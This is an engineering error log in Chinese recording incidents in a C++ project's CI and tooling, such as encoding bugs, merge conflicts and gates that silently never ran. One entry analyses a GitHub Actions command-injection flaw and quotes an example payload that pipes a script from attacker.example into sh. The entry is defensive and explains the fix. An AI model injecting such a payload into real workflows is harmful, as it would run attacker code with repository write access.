# errors.md — 踩過的錯誤

慣例見 [`INDEX.md`](INDEX.md)。每條記「**錯誤 + 根因 + 解法**」，新的在上，機密只記位置不記值。

---

## K-009 — 釘住寫入端編碼只解決一半；讀取端沒釘，例外會跑到別的執行緒去

- 日期：2026-08-10 | 來源：`CHG-20260810-05`
- 狀態：**已修復**（五支閘門腳本補釘輸出端；`test_backend_guard.py` 補釘讀取端）
- 家族：[[K-001]] / [[K-004]] 的第三代

### 錯誤

把 `tests/e1/test_backend_guard.py` 接進 CI 之前先在本機跑，14 個測試紅 1 個：

```
UnicodeEncodeError: 'charmap' codec can't encode characters in position 19-20
  File "scripts/backend_guard.py", line 173, in check
    print(f"backend_guard OK — 相位 {phase}，後端 ...")
```

依 [[K-001]] 的解法補上 `sys.stdout.reconfigure(encoding="utf-8")`，子行程不再當掉。
**但同一個測試還是紅的**，換成另一個症狀：

```
TypeError: unsupported operand type(s) for +: 'NoneType' and 'str'
    self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
```

`returncode == 0`（子行程明明成功了），`stdout` 卻是 `None`。

### 根因

`subprocess.run(..., capture_output=True, text=True)` **沒指定 `encoding`**，
父行程就用 locale 編碼（Windows cp1252）去解碼子行程的 UTF-8 輸出：

```
Exception in thread Thread-1 (_readerthread):
UnicodeDecodeError: 'charmap' codec can't decode byte 0x8d in position 26
```

關鍵在**那個例外是在 subprocess 的 reader thread 裡拋的**。它不會傳播到
`subprocess.run()` 的呼叫端——`run()` 正常回傳，`returncode` 是 0，只有 `stdout`
悄悄變成 `None`。呼叫端看到的現象是「這個指令沒有輸出」，不是「解碼失敗」。

所以這一族的陷阱有**兩端**，而修好寫入端會讓讀取端的問題**換一張臉出現**：

| | 症狀 | 誤讀成 |
|---|---|---|
| 寫入端沒釘 | `UnicodeEncodeError`，行程當掉 | 「腳本有 bug」 |
| 讀取端沒釘 | 靜默 `stdout=None`、`returncode=0` | 「指令沒有輸出」 |

### 解法

**兩端都要明示 UTF-8。**

寫入端（每支會輸出 CJK 的腳本，開頭）：

```python
for _stream in (sys.stdout, sys.stderr):
    if hasattr(_stream, "reconfigure"):
        _stream.reconfigure(encoding="utf-8", errors="replace")
```

讀取端（每個讀這些腳本輸出的 `subprocess` 呼叫）：

```python
subprocess.run(..., capture_output=True, text=True,
               encoding="utf-8", errors="replace")
```

本次補齊的寫入端：`backend_guard.py`、`halt_gate.py`、`plan.py`、
`scope_check.py`、`stage_check.py`（`status_check.py` / `workflow_lint.py` 原本就有）。

### 教訓

1. **`text=True` 不等於「用 UTF-8」**，它只是「回字串而不是 bytes」，
   編碼仍取自 locale。要 UTF-8 就得寫出來。
2. **在別的執行緒拋出的例外不會讓你的程式碼變紅**，只會讓某個值變成 `None`。
   看到「成功但沒有輸出」，先懷疑解碼。
3. 這條在 Linux CI 上永遠不會出現（預設 UTF-8）。**只在開發機咬人**——
   於是很容易被當成「我這台的問題」而不是缺陷。

---

## K-008 — PR 內文被 CI 當成指令執行：`${{ }}` 內插進 `run:` 就是命令注入

- 日期：2026-08-10 | 來源：`CHG-20260810-04`（發現於 `CHG-20260810-03` 的 PR #210 CI log）
- 狀態：**已修復**（G2 改走 `env:`；新增 G8 `workflow_lint` 防復發）

### 錯誤

PR #210 的閘門全綠、順利合併。但翻 `gate` job 的 log 時，**G2 步驟**裡有一整排：

```
line 39: Proposed: command not found
line 39: scripts/status_check.py: Permission denied
line 39: session_start.py: command not found
line 39: tests/e1/test_backend_guard.py: Permission denied
line 39: 已驗收/已收尾/accepted/closed: No such file or directory
```

那些全部是**該 PR 內文裡的 markdown 行內程式碼**。G2 只是想檢查內文有沒有 `CHG-`
字樣，結果把內文當成 shell 腳本執行了一遍。

這次的後果是良性的（沒有可執行權限、指令不存在）。但同一條路徑上，
`$(curl attacker.example/x.sh | sh)` 會在帶著 `contents: write` +
`pull-requests: write` 的 GITHUB_TOKEN 的 runner 上執行。
**任何能在本 repo 開 PR 的人都做得到，不需要任何額外權限。**

### 根因

```yaml
run: |
  echo "${{ github.event.pull_request.body }}" | grep -qE 'CHG-[0-9]{8}-'
```

關鍵在於 **`${{ }}` 不是 shell 變數**。它是 GitHub Actions 在**把腳本交給 shell
之前**做的字串替換——runner 先把 PR 內文原封不動貼進腳本檔，才啟動 bash。
於是內文裡的反引號與 `$(...)` 對 bash 而言就是命令替換語法，不是資料。

雙引號救不了：`"..."` 內部的反引號與 `$()` 照樣求值。**引號只擋斷字，不擋求值。**

這個寫法從 G2 上線起就存在，一直沒被發現，是因為**在此之前沒有人在 PR 內文裡
寫過反引號**。缺陷不是被測出來的，是被一份剛好含 markdown 行內程式碼的內文撞出來的。

### 解法

**透過 `env:` 傳值**——shell 自己去讀環境變數，值永遠是資料：

```yaml
env:
  PR_BODY: ${{ github.event.pull_request.body }}
run: |
  printf '%s' "$PR_BODY" | grep -qE 'CHG-[0-9]{8}-'
```

（`printf '%s'` 而非 `echo`：`echo` 對含 `-n`／`-e` 開頭的內容行為依實作而異。）

同時修掉同類的三處 `origin/${{ github.base_ref }}`——**git 允許分支名含 `$`、
`(`、`)` 與反引號**，ref 名內插進 `run:` 是同一個注入面，只是利用門檻較高。

**防復發：G8 `scripts/workflow_lint.py`**（`CHG-20260810-04`）。判定採**允許清單**
而非黑名單：`run:` 裡出現的 `${{ }}` 一律違規，除非在清單上（整數、SHA、repo 全名、
`steps.*.outputs.*`）。黑名單擋不完——今天擋 `body`，明天有人用 `title`、`head_ref`、
issue comment。需要例外時加 `# workflow-lint: allow <理由>`，**理由不可空白，
且必須貼在違規行本身或其上一行**（貼在步驟開頭會替日後新增的行一起背書）。

### 教訓

1. **`${{ }}` 在 `run:` 裡永遠當成「貼字串進腳本」來讀，不要當成變數。**
   要判斷安不安全，問的不是「這個值是誰的」，而是「把這段文字貼進 bash 會怎樣」。
2. **閘門的 log 要看，不是只看紅綠。** 這個缺陷所在的那次執行是**綠燈**——
   注入的指令全部失敗，但 `grep` 成功了，步驟就過了。只看 exit code 永遠看不到它。
3. 這條與 [[K-003]] 同型：**守衛自己有洞，而洞不會讓任何測試變紅。**
   差別在 K-003 是防線空轉，這條是防線本身變成攻擊面。

---

## K-007 — 契約一接上真實後端，立刻抓到 16 個單元踩在不可能成立的路徑上

- 日期：2026-08-03 | 來源：`CHG-20260803-10`（修 [[K-003]] 的當下發現）
- 狀態：**已對齊**（`CHG-20260803-11`，取 win32 嚴格版；前置條件已回到共用契約）

### 錯誤

[[K-003]] 修好、契約第一次真的跑在真實後端上，**第一次執行就紅**：

```
[  FAILED  ] NullBackend/KernelBackendContract.CreateSurfaceRequiresInitialized/null
```

win32 後端通過、null 後端失敗。

### 根因

兩個後端對「未 `init()` 就 `create_surface()`」的處理**從一開始就不一致**：

- **win32**：回 `false`。真實後端必須先註冊視窗類別，這是物理限制，不是實作偏好。
- **null**：建立成功。它只是往記憶體 vector 塞一筆，沒有任何前置條件。

舊契約**明明有這一條**（修復前的「契約 4」），但它測的是契約組自帶的 stub，
所以這個分歧從相位 1 存在至今，沒有任何機制會發現。

**真正的損害不是那一條測試紅**：追下去發現 **16 個既有單元的測試**
（c1_01/02/03/07、c2_01/08/10、c3_02/03、c4_02/03、e1_02/08/09、e4_30、e10_05）
都在**未初始化的 null 後端上建 surface**——實測需要 151 個插入點才能補齊。
那些程式路徑在**任何真實後端上都不可能成立**。相位 1 全程沒有人察覺，
因為 null 後端太寬容，而契約沒在看。

### 處置歷程：先釘住，再對齊

**第一步（`CHG-20260803-10`）— 釘住。** 對齊要改動承重單元 E1-24 的行為並牽動 16 個單元
的測試，屬獨立的方向決策，不該夾帶在「修契約鴻溝」那張 CHG 裡。故兩邊各留一條測試
釘住現況，讓分歧可見且被追蹤。

**第二步（`CHG-20260803-11`）— 對齊到 win32 嚴格版。** 使用者裁定方向後執行：
`NullKernelBackend::create_surface` 加上 `initialized_` 前置條件，
26 個測試檔補上 `init()`，兩條釘住用的測試移除，前置條件回到共用契約
（現為 17 條，null 與 win32 各跑一遍）。

### 對齊時踩到的三種「看起來像宣告，其實不是」

批次插入 `init()` 連續失敗三次，每次成因不同——記下來，因為任何對 C++ 做文字批次處理
的工具都會遇到同一組陷阱：

| 樣式 | 為什麼不能插入 | 正確做法 |
|---|---|---|
| `struct Rig { NullKernelBackend b{...}; ... };` | 成員宣告區不能放陳述句 | 加成員初始器 `bool b_initialized_ = b.init();`——C++ 保證成員依**宣告順序**初始化，故它在其後成員建構前完成。**不能用建構子本體**：那在所有成員建構之後才跑，太晚 |
| `NullKernelBackend make_backend(...) {` | 這是**回傳型別為該型別的函式定義**，不是變數宣告 | 排除以 `(` 接續且不以 `);` 結尾者 |
| `NullKernelBackend b(caps());` | 是宣告，但被上一條的排除規則誤殺 | 以「該行是否以 `);` 結尾」區分宣告與函式定義 |

### 可帶走的通則

- **過度寬容的測試替身會把 bug 養大。** null 後端「什麼都接受」讓 16 個單元長出了
  在真實環境不可能成立的用法。替身應該**盡量嚴格**，寬容留給真實實作。
- **一個沒被執行過的契約條款，等於不存在。** 舊契約寫了「未初始化不得建立」，
  白紙黑字擺了整個相位 1，卻擋不下任何東西。
- **修好一道檢查之後，第一次執行的紅燈是資產不是麻煩。** 它一次付清了長期累積的欠款。
- 發現的問題大到需要獨立決策時，**釘住現況並記錄，比匆促對齊或默默跳過都好**。
- **對 C++ 做文字批次處理，務必先分類再動手**，且每輪都要建置驗證。
  「看起來像宣告」的樣式至少有三種不同語意（見上表）。

### 可帶走的通則

- **過度寬容的測試替身會把 bug 養大。** null 後端「什麼都接受」讓 16 個單元長出了
  在真實環境不可能成立的用法。替身應該**盡量嚴格**，寬容留給真實實作。
- **一個沒被執行過的契約條款，等於不存在。** 舊契約寫了「未初始化不得建立」，
  白紙黑字擺了整個相位 1，卻擋不下任何東西。
- **修好一道檢查之後，第一次執行的紅燈是資產不是麻煩。** 它一次付清了長期累積的欠款。
- 發現的問題大到需要獨立決策時，**釘住現況並記錄，比匆促對齊或默默跳過都好**。
  匆促對齊會把方向決策藏進技術變更裡；默默跳過則讓下一個人重新踩一次。

## K-006 — CI 釘死 VS 產生器版本；以及一個差點讓我修錯方向的假線索

- 日期：2026-08-03 | 來源：`CHG-20260803-08`（G3w windows runner 首次執行）

### 錯誤

新增的 Windows 建置閘門第一次執行就紅，54 秒即失敗：

```
CMake Error at CMakeLists.txt:6 (project):
  Generator
    Visual Studio 17 2022
  could not find any instance of Visual Studio.
```

### 根因

workflow 裡把產生器版本釘死為 `-G "Visual Studio 17 2022"`
（照抄開發機上可用的那條指令），而 **GitHub runner 映像的 VS 版本會隨時間更新**。
開發機裝的是 VS 2022 Build Tools，`windows-latest` 上不是——
於是在本機百分之百可用的指令，到 CI 上必定失敗。

**把工具鏈版本釘死在 CI，等於把閘門綁在某一版 runner 映像上**，
映像一更新就壞，而且壞的時間點與任何程式碼變更都無關。

### 解法

省略 `-G`，讓 CMake 挑該機器上實際存在的 VS；`-A x64` 仍要指定
（不給的話 VS 產生器的預設平台不保證是 x64）：

```bash
cmake -S . -B build -A x64
grep -E '^CMAKE_GENERATOR(_PLATFORM)?:' build/CMakeCache.txt   # 印出實際選到的，供日後診斷
cmake --build build --config Debug --parallel 4
```

### 假線索：本機重現失敗，但失敗原因與待驗證的假設無關

為了在本機驗證修法，先把「不指定 `-G`」的 configure 跑在 scratchpad 目錄，
結果 `No CMAKE_CXX_COMPILER could be found`——**看起來剛好證實了「不指定產生器就找不到編譯器」**。

該結論是錯的。換到 repo 內跑同一個指令即正常。真正的原因是那個 scratchpad 路徑
（含 `HARUTS~1` 8.3 短檔名、且很長）干擾了 VS 執行個體探測，與 `-G` 與否毫無關係。

**若照第一次的結果下判斷，會往完全錯誤的方向修**——例如去改 CMakeLists、
加 `CMAKE_GENERATOR_INSTANCE`、或乾脆放棄不釘版本的做法。

### 可帶走的通則

- **CI 不要釘死工具鏈版本**（VS 產生器、編譯器路徑、SDK 版本）。
  讓工具自己找；真的需要固定時，用 runner 映像本身的版本標籤來固定，不要寫死在指令裡。
- **同時印出「實際選到什麼」**。日後環境變動時，那一行是第一個線索，成本近乎為零。
- **驗證失敗時，先確認「這次失敗」與「你要驗的假設」是同一件事。**
  在非典型環境（暫存路徑、短檔名、超長路徑、權限受限目錄）重現問題，
  很容易得到一個**恰好符合預期但成因完全不同**的失敗——那比沒有重現更危險，
  因為它會讓錯誤的假設看起來已被證實。換一個乾淨環境再跑一次，成本很低。
- 對照 [[K-002]]：兩者都是「看起來成立的證據其實在說別的事」。

## K-005 — squash merge 之後，從舊分支再開新分支必然衝突，而且閘門會安靜地不跑

- 日期：2026-08-03 | 來源：`CHG-20260803-07`（發生於 `CHG-20260803-06` 的 PR #196）

### 錯誤

開了 PR，結果 `gh pr checks` 回 **`no checks reported`**，PR 停在 OPEN 不動。
看起來像 CI 壞了或 workflow 沒設好——實際上 workflow 完全正常，
是 PR 本身處於 `mergeStateStatus: DIRTY`（有合併衝突），GitHub 因此不跑檢查。

### 根因

本 repo 的 governance workflow 一律以 **squash merge** 合併（`gh pr merge --squash`）。
squash 會把分支上的多個 commit 壓成 **main 上一個全新的 commit**，
**原本那些 commit 永遠不會成為 main 的祖先**。

於是：分支 A 被 squash 進 main 之後，如果又從**分支 A**（而不是從 `origin/main`）開分支 B，
分支 B 就同時帶著「A 的原始 commit」與「B 自己的 commit」，
而 main 帶著「A 的 squash 版本」。同一份內容出現在兩條互不相干的祖先線上 → 衝突。

**為什麼特別容易中招**：本機看起來一切正常——分支建得出來、commit 得了、
建置與測試全綠。問題只在**推上去之後**才顯現，而且第一個症狀（沒有檢查）
指向的方向完全錯誤（會讓人去查 workflow 設定、觸發條件、權限）。

### 解法

**squash merge 的 repo 裡，每一條新分支都必須從 `origin/main` 開：**

```bash
git fetch origin
git checkout -b <新分支> origin/main
git cherry-pick <要帶過來的 commit>
```

已經開錯的話，把分支重設到 main 再 cherry-pick，然後 force-push 更新 PR：

```bash
git fetch origin
git reset --hard origin/main
git cherry-pick <commit>
git push --force-with-lease origin <分支>
```

**換基底之後要重跑驗證。** 內容一樣不代表結果一樣——新基底上的其他變更可能與之互動。
本次即在新基底上重跑了全建與全套測試才推。

### 可帶走的通則

- **「沒有檢查」不等於「CI 壞了」。** 先查 `gh pr view --json mergeStateStatus`：
  `DIRTY` = 衝突、`BLOCKED` = 等檢查、`CLEAN` = 可合併。症狀與根因常常離很遠。
- **squash merge 會讓「分支已合併」與「commit 在 main 的歷史裡」變成兩件事。**
  用 `git log origin/main..HEAD` 判斷「還沒進 main 的東西」時，
  已被 squash 的 commit 仍會出現在列表裡——那是正常的，不是漏推。
- 連續交付多個相依的變更時，**每一輪都回到 `origin/main` 重新開分支**，
  不要在前一條分支上疊。前一條隨時可能被 squash 掉。

## K-004 — 同一個字集陷阱的第二次現身：PowerShell 讀 BOM-less `.ps1` 也用 ANSI codepage

- 日期：2026-08-03 | 來源：`CHG-20260803-05` 施工過程（工具鏈問題，未進 repo 的 scratchpad 腳本）

### 錯誤

驗收用的 PowerShell 腳本（UTF-8 無 BOM、含中文說明與輸出）執行時：
第一次是 `New-Object System.Drawing.Bitmap(...)` **回傳 null 卻不報錯**，
後續才在毫不相干的行號爆出 `Unexpected token` / `The string is missing the terminator`。
症狀看起來像是防毒攔截或 API 失敗，實際上兩者都不是。

### 根因

**與 K-001 完全同一個機制，只是換了個宿主。** PowerShell 5.1 讀取**沒有 BOM** 的 `.ps1`
檔案時，用的是「非 Unicode 程式的系統地區設定」那個 ANSI codepage（本機為 **CP932**），
不是 UTF-8。中文字的 UTF-8 位元組被誤判為雙位元組前導碼，吃掉字串的結尾引號 →
剖析從那一行開始錯位 → 後面的變數變成 `$null`、或在完全無關的位置報語法錯誤。

**為什麼特別難認**：錯誤位置與真正的壞行相距很遠，而且第一個症狀（`$bmp` 是 null）
根本不長得像編碼問題。很容易誤判成環境因素（防毒、權限、API 失敗）而往錯誤方向查。

### 解法

擇一：

1. **腳本寫成純 ASCII**（本次採用）——中文說明改放在對話 / 文件裡，不放進 `.ps1`。
2. 存檔時加 **UTF-8 BOM**，PowerShell 5.1 即會正確辨識。
3. 改用 PowerShell 7+（預設 UTF-8）。

### 可帶走的通則

- **「UTF-8 無 BOM + 非 UTF-8 系統地區設定」是這台機器上的系統性陷阱**，不是單一工具的毛病。
  已經在 **MSVC**（K-001）與 **PowerShell**（本條）各咬一次。
  往後任何吃檔案的工具都要先問：它預設用什麼編碼讀？
- **症狀離根因很遠時，先懷疑編碼。** 尤其當「錯誤行看起來完全正常」時。
- 排錯順序上，**先排除自己這一側的可能，再歸咎環境**（防毒、權限、網路）。
  本次一度往防毒方向猜，實際上跟防毒毫無關係。

## K-003 — 兩道「防線」同時空轉：契約測試沒測任何真實後端，守它的閘門掃錯副檔名

- 日期：2026-08-03 | 來源：`CHG-20260803-03` | 狀態：**兩者皆已修復**
  （閘門於 `CHG-20260803-03`；契約鴻溝於 `CHG-20260803-10`——修好當下即抓到 [[K-007]]）

### 錯誤

準備進相位 2 寫 win32 後端時，本要依 PHASE-PLAN 的承諾「契約測試不改一行拿去跑新後端」，
結果發現**做不到**，而且**沒有任何機制會告訴你做不到**。

### 根因

兩個獨立的問題，剛好互相掩護：

**① 契約測試測的是自己的 stub，不是任何真實後端。**
repo 裡有兩個同名但毫不相干的 `KernelBackend`：`ds::kernel::KernelBackend`（真實後端實作的那個，
具名 `SurfaceId` + `bool` + `begin_frame`/`poll_input`）與 `ds::kernel::contract::KernelBackend`
（契約測試自帶的，`SurfaceHandle` 數字 handle + `Status` 三態 + `invoke_capability`）。
契約組**刻意不 link** null 後端以「維持單元獨立」，只測目錄內的 `StubBackend`。
它的註解寫「未來各後端加一個 factory 即納入」——但型別不相容，加不進去。

**② 守「契約測試不得分平台」的閘門掃 `tests/contract/**/*.py`，而契約測試是 C++。**
該目錄 `.py` 檔數為 **0**。這道檢查從上線起執行了無數次、次次綠燈，**一次都沒真正檢查過東西**。

單元獨立性（好意）換掉了契約的唯一用途；而唯一會抱怨的閘門正好瞎了。

### 解法

**已修**：閘門補上 C/C++ 掃描。關鍵設計——**只檢查前處理器指令行**（第一個非空白字元為 `#`），
不做全文比對。因為契約測試的註解本來就會寫「不得出現 `win32` / `cocoa`」，
全文比對會把自我約束的說明判成違規，逼人刪註解；而註解行永遠不以 `#` 開頭，天然免疫。

**未修**：契約與真實後端的型別鴻溝。需重寫 E1-25 或加轉接層，屬獨立的 medium 級工程。
在那之前，**任何後端都不得宣稱「通過契約測試」**——W1-01 的 acceptance 欄位已明文寫死這點。

### 可帶走的通則

- **一道從未紅過的閘門，和一道不存在的閘門，外觀完全相同。** 新增或修改檢查時，
  必須跑一次負向測試證明它會紅；只看到綠燈不代表它在工作。
- **檢查器要對得上被檢查物的實際形狀**（副檔名、路徑、語言）。
  `**/*.py` 掃一個 C++ 目錄，會安靜地永遠通過。
- **「單元獨立性」不能凌駕於元件存在的理由之上。** 契約測試不 link 任何真實後端以保持獨立，
  結果是它不再驗證任何東西。獨立性是手段，不是目的。
- 加檢查時順手問一句：**它在什麼情況下會紅？** 答不出具體情境，那就是還沒有這道檢查。

## K-002 — 用 `0.0` 當「取樣失敗」的代表值，讓壞掉的指標看起來像「很閒」，還騙過了驗收

- 日期：2026-08-03 | 來源：`CHG-20260803-02` | 環境：Windows / `examples/cpu_gpu_validator`

### 錯誤

驗證器在 Windows 上跑起來，畫面渲染完全正常，**CPU 量表 12 幀有 10 幀是 0.0%**——
而驗證器**自己印 `✓ PASS`、回 exit 0**。

### 根因

三層，一層比一層嚴重：

1. **`GetSystemTimes` 是差分式 API**，兩次取樣之間必須真的經過時間（系統時鐘約 15.6ms 一跳）。
   原迴圈幀與幀之間**完全沒有間隔**，差分恆為 0。
2. **失敗值與合法值撞號**：取樣失敗時回 `0.0`——但 `0.0` 是完全合法的 CPU%。
   於是「量表死掉」與「CPU 很閒」在呼叫端眼中**一模一樣**，無從分辨。
3. **驗收條件只檢查 `fill_ratio ∈ [0,1]`**，而 `0.0` 完美滿足。
   → 指標整輪死掉照樣 PASS。**這是會放行任何未來指標故障的假綠燈，比缺陷本身危險。**

附帶：同一函式的首次呼叫拿 `prev_* = 0` 去差分，算出的是「**開機至今的平均 CPU**」而非瞬時值，
且與它自己的註解（「首次呼叫回 0」）相反。它會印出一個看似合理的數字，因此比回 0 更難察覺。

### 解法

1. **失敗值不可與合法值撞號**：改回 `-1.0` 表示「這次取樣無效」。首次呼叫只建立基準點並回 `-1.0`。
2. 迴圈加取樣間隔 `std::this_thread::sleep_for(250ms)`（標準 C++，不引入平台分支；
   POSIX 的 `getloadavg` 無狀態、不受影響）。
3. **驗收拆成兩條**：①組裝（`fill_ratio ∈ [0,1]`）②取樣（有效樣本必須 12/12）。
   任一條紅 → `✗ FAIL` + exit 1。

### 可帶走的通則

- **不要用值域內的合法值當錯誤代表值。** `0`、`-1`、空字串只要落在合法值域，
  錯誤就會偽裝成正常資料流過所有下游檢查。
- **「範圍檢查」不等於「有效性檢查」。** `fill_ratio ∈ [0,1]` 對一個永遠回 0 的死指標永遠成立。
  驗收條件要問「這個值是不是活的」，不是只問「這個值格式對不對」。
- **新加的驗收條件要跑一次負向測試。** 本案把取樣間隔暫時改 0 重跑，確認條件②真的紅、
  且條件①在同一輪仍然全綠——沒跑這步的話，等於加了一條從未被證明會擋任何東西的規則。

## K-001 — MSVC 以系統 ANSI codepage 誤讀 UTF-8 原始碼，中文字串炸成 69 個編譯錯誤

- 日期：2026-08-03 | 來源：`CHG-20260803-01` | 環境：Windows 11 / MSVC 19.44 / VS Build Tools 2022 17.14

### 錯誤

Windows 首次 MSVC 全建，69 個編譯錯誤：

```
src\kernel\capability_matrix.cpp(20,26): error C2001: 常數中包含新行字元
engine\format\document.cpp(373,9):      error C2143: 語法錯誤: 遺漏 ')' (在 '}' 之前)
```

分佈：C2001 ×27、C2143 ×23、C2146 ×8、C2059 ×4、C2064 ×3、C1075 ×2、C2317 ×1、C2318 ×1。
出錯位置全部指向**含中文的字串字面值**那幾行，程式碼本身看起來完全正常。

### 根因

**不是程式碼問題，是原始碼字集問題。**

本庫原始碼一律 **UTF-8 無 BOM**，註解與字串大量含中文。MSVC 在**沒有 `/utf-8`** 時，
不會假設 UTF-8——它用「非 Unicode 程式的系統地區設定」那個 **ANSI codepage** 去解讀原始碼位元組
（該機為 **CP932**；zh-TW 機器則是 CP950，症狀相同）。

中文字的 UTF-8 位元組序列被誤判為雙位元組字元的**前導碼**，於是把緊接的位元組（包含字串的**結尾引號**）
一起吞掉 → 字串未收尾 → C2001「常數中包含新行字元」。其後的 C2143 / C2146 / C2059 / C1075 等
全是這個的**下游語法崩塌**，不是獨立問題——修掉字集，42 個下游錯誤一起消失。

**為什麼 CI 抓不到**：GCC 與 Clang 預設就以 UTF-8 解讀原始碼。此問題在 Linux / macOS 上
**結構上不可能出現**，而 CI 是 ubuntu + GCC。任何只靠 ubuntu CI 的專案都會在 Windows day-1 首建才撞到。

**為什麼不是「MSVC 比較嚴格」**：與 MSVC 版本、C++ 標準、程式邏輯都無關，
純粹取決於**那台 Windows 機器的系統地區設定**。同一份原始碼在系統地區設定為 UTF-8（beta 選項）的
Windows 上不會出錯——所以它還會**因機器而異**，更難重現。

### 解法

根 `CMakeLists.txt` 加 MSVC 專屬旗標，置於所有 `add_subdirectory()` 之前：

```cmake
if(MSVC)
  add_compile_options(/utf-8)
endif()
```

`/utf-8` 同時把**來源字集**與**執行字集**設為 UTF-8。套用後全建 **0 error、0 warning**，
ctest **176/176 Passed**。

要點：

- **必須用 `if(MSVC)` 包住**。`/utf-8` 是 MSVC 專屬旗標，GCC / Clang 收到會報錯。包住之後
  ubuntu CI 行為與修正前完全相同。
- **位置要夠前面**。`add_compile_options()` 是目錄範圍、只影響**其後**加入的子目錄，
  放在 `add_subdirectory()` 迴圈之後會完全沒效果。
- 不要改用「幫原始碼加 BOM」的解法。那要動 1000 多個檔，且與 `scope_check` 的 write_scope 紀律衝突。
- 別被錯誤數量誤導去逐檔改程式。**69 個錯誤是 1 個根因**；先確認錯誤是否集中在含非 ASCII 字元的行。

### 未關閉的缺口

ubuntu CI **驗證不到這個修正**（GCC 本來就過），故此修正目前只有本機證據。
要讓「Windows 編不編得過」真正進入閘門，必須在 `governance.yml` 加 **windows runner** 跑 MSVC 全建
（`docs/backlog/phase2-desktop-runtime.md` §6 checklist 步驟 3）。**在那之前，這個坑隨時可能以別的形式重開。**
